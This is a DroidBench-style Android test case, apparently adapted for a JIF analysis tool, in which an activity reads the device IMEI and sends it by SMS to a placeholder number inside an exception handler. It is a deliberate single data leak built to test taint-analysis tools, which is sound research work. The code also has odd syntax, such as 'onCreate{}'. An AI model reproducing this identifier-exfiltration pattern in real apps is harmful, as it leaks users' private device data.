package test;

import test.Activity;
import android.content.Context;
import android.os.Bundle;
import test.SmsManager;
import android.telephony.TelephonyManager;
import test.R;
import jif.runtime.Runtime;

/**
 * @testcase_name Exceptions1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description tainted data is created and sent out in an exception handler
 * @dataflow source -> imei -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle exceptions
	* ADAPTACIONES:
	* 37 y 40, try-catch Nullpointer exception
 */
public class Exceptions1 extends Activity {

    @Override
    protected void onCreate{}(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout);
        String imei = "";
        try {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            imei = telephonyManager.getDeviceId();
            throw new RuntimeException();
        } catch (RuntimeException ex) {
            try {
                SmsManager sm = SmsManager.getDefault();
                sm.sendTextMessage("+49 1234", null, imei, null, null);
            } catch (NullPointerException e) {
            }
        }
    }
}
